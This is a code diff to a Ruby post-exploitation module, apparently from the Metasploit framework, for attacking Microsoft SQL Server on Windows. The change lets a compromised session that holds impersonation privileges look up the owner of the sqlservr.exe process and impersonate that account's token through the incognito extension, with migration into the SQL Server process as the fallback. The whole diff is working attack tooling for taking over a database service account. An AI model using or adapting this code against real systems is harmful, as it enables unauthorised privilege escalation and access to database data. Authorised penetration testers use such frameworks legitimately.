@@ -100,19 +100,42 @@ module MSSQL
   def impersonate_sql_user(service)
     pid = service[:pid]
     vprint_status("Current user: #{session.sys.config.getuid}")
+    current_privs = client.sys.config.getprivs
+    if current_privs.include?('SeImpersonatePrivilege') ||
+       current_privs.include?('SeTcbPrivilege') ||
+       current_privs.include?('SeAssignPrimaryTokenPrivilege')
+      username = nil
+      session.sys.process.each_process do |process|
+        if process['pid'] == pid
+          username = process['user']
+          break
+        end
+      end
 
-    # Attempt to migrate to target sqlservr.exe process
-    # Migrating works, but I can't rev2self after its complete
-    print_warning("Attempting to migrate to process #{pid}...")
-    begin
-      session.core.migrate(pid)
-    rescue Rex::RuntimeError => e
-      print_error(e.to_s)
-      return false
+      session.core.use('incognito') unless session.incognito
+      vprint_status("Attemping to impersonate user: #{username}")
+      res = session.incognito.incognito_impersonate_token(username)
+
+      if res =~ /Successfully/i
+        print_good("Impersonated user: #{username}")
+        return true
+      else
+        return false
+      end
+    else
+      # Attempt to migrate to target sqlservr.exe process
+      # Migrating works, but I can't rev2self after its complete
+      print_warning("No SeImpersonatePrivilege, attempting to migrate to process #{pid}...")
+      begin
+        session.core.migrate(pid)
+      rescue Rex::RuntimeError => e
+        print_error(e.to_s)
+        return false
+      end
+
+      vprint_status("Current user: #{session.sys.config.getuid}")
+      print_good("Successfully migrated to sqlservr.exe process #{pid}")
     end
-
-    vprint_status("Current user: #{session.sys.config.getuid}")
-    print_good("Successfully migrated to sqlservr.exe process #{pid}")
 
     true
   end
